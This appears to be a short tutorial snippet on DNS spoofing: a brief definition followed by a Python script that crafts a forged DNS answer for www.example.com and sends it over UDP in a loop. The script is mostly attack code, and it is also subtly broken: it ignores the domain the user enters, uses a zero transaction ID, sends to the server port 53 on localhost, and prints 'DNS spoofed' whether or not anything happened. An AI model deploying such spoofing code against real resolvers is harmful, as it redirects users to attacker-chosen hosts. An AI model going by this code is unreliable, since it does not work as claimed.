#DNS SPOOFING :

'''DNS spoofing involves an attacker providing false DNS information to a DNS resolver or cache.
Typically, attackers target DNS caches, which store DNS records for faster access and reduced network traffic'''

//CODE
import socket

# Define a DNS server IP address (simulated authoritative DNS server)
dns_server_ip = "192.168.1.100"

# Define a function to perform DNS spoofing
def dns_spoof(query_domain, spoofed_ip):
    # Create a UDP socket
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Define the DNS response with a spoofed IP address
    dns_response = (
        b"\x00\x00\x81\x80"  # DNS header flags (response, recursion desired)
        b"\x00\x01"  # Questions count
        b"\x00\x01"  # Answer count
        b"\x00\x00"  # Authority count
        b"\x00\x00"  # Additional count
        b"\x03www\x07example\x03com\x00"  # Query domain (www.example.com)
        b"\x00\x01"  # Query type (A)
        b"\x00\x01"  # Query class (IN)
        b"\xc0\x0c"  # Pointer to domain name in the response (compression)
        b"\x00\x01"  # Response type (A)
        b"\x00\x01"  # Response class (IN)
        b"\x00\x00\x00\x3c"  # Time to live (60 seconds)
        b"\x00\x04"  # Data length (IPv4 address)
        + bytes(map(int, spoofed_ip.split(".")))  # Spoofed IP address
    )

    # Send the DNS response to the requesting client
    udp_socket.sendto(dns_response, ("127.0.0.1", 53))  # Assuming DNS client is on the same machine

    # Close the socket
    udp_socket.close()

# Simulate DNS queries and responses
while True:
    query_domain = input("Enter a domain to spoof (e.g., www.example.com): ")
    spoofed_ip = input("Enter the IP address to spoof: ")

    dns_spoof(query_domain, spoofed_ip)
    print(f"DNS spoofed: {query_domain} -> {spoofed_ip}")
